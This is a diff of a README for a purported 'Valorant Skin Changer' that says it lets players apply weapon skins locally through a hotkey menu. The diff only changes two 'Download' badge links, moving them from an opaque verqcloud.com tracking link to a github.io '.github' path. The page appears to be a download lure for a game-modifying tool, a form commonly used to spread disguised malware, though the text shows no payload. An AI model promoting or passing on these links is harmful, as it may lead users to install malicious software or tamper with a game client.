@@ -2,7 +2,7 @@
 
 **Valorant Skin Changer** is a tool designed to allow players to customize and preview various weapon skins within *Valorant* locally. This skin changer provides a way to alter the visual appearance of your weapons without affecting gameplay or requiring external purchases, and works purely for aesthetic purposes in offline modes, training maps, or private matches.
 
-[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://valorant-skins-changer.github.io/.github/)
 
 ## 🚀 Features
 
@@ -23,4 +23,4 @@
 5. **Open** the menu using the hotkey (e.g., `Insert` or a custom key binding).
 6. **Choose** the desired skin and apply it.
 
-[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download Valorant SkinChanger](https://img.shields.io/badge/Download-Valorant%20SkinChanger-blueviolet)](https://valorant-skins-changer.github.io/.github/)
